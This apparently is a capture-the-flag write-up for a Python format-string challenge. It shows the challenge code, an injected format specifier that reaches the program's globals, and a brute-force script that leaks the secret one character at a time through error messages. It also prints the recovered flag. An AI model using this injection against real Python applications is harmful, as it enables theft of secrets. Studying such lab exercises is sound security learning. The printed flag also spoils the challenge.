---
layout: default
title: Python-Format-String
---
This is 

```python
#!/usr/bin/python3

SECRET = open("/challenge/app-script/ch25/.passwd").read()

class Sandbox:
    
    def ask_age(self):
        self.age = input("How old are you ? ")
        self.width = input("How wide do you want the nice box to be ? ")
    
    def ask_secret(self):
        if input("What is the secret ? ") == SECRET:
            print("You found the secret ! I thought this was impossible.")
        else:
            print("Wrong secret")

    def run(self):
        while True:
            self.ask_age()
            to_format = f"""
Printing a {self.width}-character wide box:
[Age: {{ self.age:{self.width }}} ]"""
            print(to_format.format(self=self))
            self.ask_secret()

Sandbox().run()
```

As you can see, we give both age and width.
After the formating with the `f"""`, it goes to the next format, of string like `{self.age:4}`, when 4 is the width.
However, we can give whatever we want in the width, and then control the `format-specification`. Look here for more details [https://docs.python.org/3/library/string.html#format-specification-mini-language](https://docs.python.org/3/library/string.html#format-specification-mini-language). As we can see from the table, there are several possible characters to give:

![[Pasted image 20260312185347.png]]

Let's try them, and see what happens:
- **s**:
![[Pasted image 20260312185427.png]]

- **c** (and also all other chars)
![[Pasted image 20260312185521.png]]

Notice, `_` give something a bit different, we will handle it in our script.

Now, next step will be injecting and reading the `SECRET`, char by char, by giving this input:
```python
{self.ask_age.__globals__[SECRET][0]}
```

Let's test the first char, check what we get:

![[Pasted image 20260312185713.png]]

Okay, so first char is `m`. I wrote script in python to brute force all chars:

```python
import subprocess
import re

binary = "/challenge/app-script/ch25/setuid-wrapper"

secret = b""
i = 0

while True:
    p = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    # NOTE:
# GitHub Pages uses the Liquid template engine, which interprets {{ ... }} as a template variable.
# Because this payload intentionally contains {{ }} as part of the exploit,
# we wrap it in `{% raw %}` blocks so Jekyll will render it literally
# instead of trying to parse it.
    {% raw %}
    payload = f"{{ self.ask_age.__globals__[SECRET][{ i }] }}\n"
    {% endraw %}    inp = b"1\n" + payload.encode()
    out, _ = p.communicate(inp)

    m = re.search(br"Unknown format code '(.)'", out)
    if not m:
        m = re.search(br"Cannot specify '(.)' with 's'", out)
    if m:
        c = m.group(1)
        secret += c
        print(f"[{i}] -> {c.decode()} | {secret}")
        i += 1

    else:
        if b"string index out of range" in out:
            print("Secret found !")
            print(f"Secret: {secret.decode()}")
            break
        secret += b's'
        i += 1
        print(f"[{i}] -> s | {secret}")
```

![[Pasted image 20260312184922.png]]

We found the password **my_secretPa$$**

![[Pasted image 20260312184957.png]]